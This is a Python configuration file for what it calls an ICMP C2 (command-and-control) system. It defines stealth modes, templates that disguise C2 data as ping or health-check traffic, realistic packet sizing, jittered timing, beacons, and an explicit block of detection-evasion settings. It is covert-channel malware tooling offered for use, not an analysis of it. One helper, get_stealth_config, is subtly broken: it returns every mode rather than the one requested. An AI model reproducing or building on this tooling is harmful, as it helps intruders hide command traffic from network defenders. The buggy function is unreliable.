#!/usr/bin/env python3
"""
Stealth Configuration for ICMP C2 System
Customize these settings to adjust stealth behavior
"""

# Stealth Mode Configuration
STEALTH_MODES = {
    'stealth': {
        'description': 'Maximum stealth - slow but very hard to detect',
        'obfuscation_level': 3,  # High obfuscation
        'max_packets_per_minute': 30,
        'max_packets_per_hour': 500,
        'base_delay': (2.0, 8.0),  # Random delay between 2-8 seconds
        'use_beacons': True,
        'packet_size_variation': True,
        'realistic_icmp_params': True
    },
    'normal': {
        'description': 'Balanced stealth and performance',
        'obfuscation_level': 2,  # Medium obfuscation
        'max_packets_per_minute': 60,
        'max_packets_per_hour': 1000,
        'base_delay': (1.0, 5.0),  # Random delay between 1-5 seconds
        'use_beacons': False,
        'packet_size_variation': True,
        'realistic_icmp_params': True
    },
    'aggressive': {
        'description': 'Fast performance - easier to detect',
        'obfuscation_level': 1,  # Basic obfuscation
        'max_packets_per_minute': 120,
        'max_packets_per_hour': 2000,
        'base_delay': (0.5, 2.0),  # Random delay between 0.5-2 seconds
        'use_beacons': False,
        'packet_size_variation': False,
        'realistic_icmp_params': False
    }
}

# Obfuscation Patterns
OBFUSCATION_PATTERNS = {
    'ping_like': [
        "PING {timestamp} ({random_id}): {data} data",
        "ping: {timestamp}:{random_data}:{encoded_data}",
        "ICMP echo request, id {random_id}, seq {random_seq}",
        "ping {random_size} bytes"
    ],
    'network_like': [
        "network: {timestamp}:{random_data}:{encoded_data}",
        "probe: {random_id}:{encoded_data}",
        "check: {timestamp}:{random_data}:{encoded_data}"
    ],
    'system_like': [
        "sys: {timestamp}:{random_data}:{encoded_data}",
        "monitor: {random_id}:{encoded_data}",
        "health: {timestamp}:{random_data}:{encoded_data}"
    ]
}

# Rate Limiting Profiles
RATE_LIMIT_PROFILES = {
    'conservative': {
        'max_packets_per_minute': 20,
        'max_packets_per_hour': 300,
        'burst_limit': 5,
        'burst_window': 10  # seconds
    },
    'moderate': {
        'max_packets_per_minute': 60,
        'max_packets_per_hour': 1000,
        'burst_limit': 15,
        'burst_window': 10
    },
    'permissive': {
        'max_packets_per_minute': 120,
        'max_packets_per_hour': 2000,
        'burst_limit': 30,
        'burst_window': 10
    }
}

# Network Interface Detection
NETWORK_INTERFACES = {
    'linux': ['eth0', 'ens33', 'wlo1', 'wlan0', 'eno1', 'enp0s3'],
    'windows': ['Ethernet', 'Wi-Fi', 'Local Area Connection'],
    'macos': ['en0', 'en1', 'en2', 'en3']
}

# Packet Size Distribution (weights for realistic sizing)
PACKET_SIZE_DISTRIBUTION = {
    56: 0.30,   # Very common
    64: 0.25,   # Common
    128: 0.20,  # Common
    256: 0.15,  # Less common
    512: 0.05,  # Uncommon
    1024: 0.03, # Rare
    1472: 0.02  # Very rare
}

# Delay Patterns (mimic real network behavior)
DELAY_PATTERNS = {
    'normal': {
        'base_delay': (1.0, 3.0),
        'jitter': (-0.5, 0.5),
        'congestion_probability': 0.05,
        'congestion_delay': (2.0, 8.0)
    },
    'slow': {
        'base_delay': (3.0, 8.0),
        'jitter': (-1.0, 1.0),
        'congestion_probability': 0.15,
        'congestion_delay': (5.0, 15.0)
    },
    'fast': {
        'base_delay': (0.5, 2.0),
        'jitter': (-0.2, 0.2),
        'congestion_probability': 0.02,
        'congestion_delay': (1.0, 3.0)
    }
}

# Session ID Generation Patterns
SESSION_PATTERNS = {
    'timestamp': '{timestamp}{random_hex}',
    'uuid_like': '{random_uuid}',
    'hash_based': '{timestamp_hash}{random_suffix}',
    'numeric': '{timestamp}{random_numeric}'
}

# Beacon Configuration
BEACON_CONFIG = {
    'enabled': True,
    'probability': 0.05,  # 5% chance per session
    'payloads': [
        "ping beacon",
        "network check",
        "system status",
        "health check"
    ],
    'intervals': (300, 1800)  # Random interval between 5-30 minutes
}

# Detection Evasion Settings
EVASION_SETTINGS = {
    'payload_rotation': True,  # Rotate payload patterns
    'size_randomization': True,  # Randomize packet sizes
    'timing_randomization': True,  # Add random delays
    'header_randomization': True,  # Randomize ICMP headers
    'session_randomization': True,  # Randomize session IDs
    'beacon_randomization': True   # Randomize beacon behavior
}

def get_stealth_config(mode='normal'):
    """
    Get stealth configuration for specified mode
    """
    if mode not in STEALTH_MODES:
        print(f"Warning: Unknown stealth mode '{mode}', using 'normal'")
        mode = 'normal'
    
    return STEALTH_MODES

def get_rate_limit_config(profile='moderate'):
    """
    Get rate limiting configuration for specified profile
    """
    if profile not in RATE_LIMIT_PROFILES:
        print(f"Warning: Unknown rate limit profile '{profile}', using 'moderate'")
        profile = 'moderate'
    
    return RATE_LIMIT_PROFILES[profile]

def get_delay_config(pattern='normal'):
    """
    Get delay configuration for specified pattern
    """
    if pattern not in DELAY_PATTERNS:
        print(f"Warning: Unknown delay pattern '{pattern}', using 'normal'")
        pattern = 'normal'
    
    return DELAY_PATTERNS[pattern]

def print_stealth_info():
    """
    Print information about available stealth configurations
    """
    print("Available Stealth Modes:")
    for mode, config in STEALTH_MODES.items():
        print(f"  {mode}: {config['description']}")
        print(f"    - Obfuscation Level: {config['obfuscation_level']}")
        print(f"    - Rate Limit: {config['max_packets_per_minute']}/min, {config['max_packets_per_hour']}/hour")
        print(f"    - Delay Range: {config['base_delay'][0]}-{config['base_delay'][1]} seconds")
        print()

if __name__ == "__main__":
    print_stealth_info() 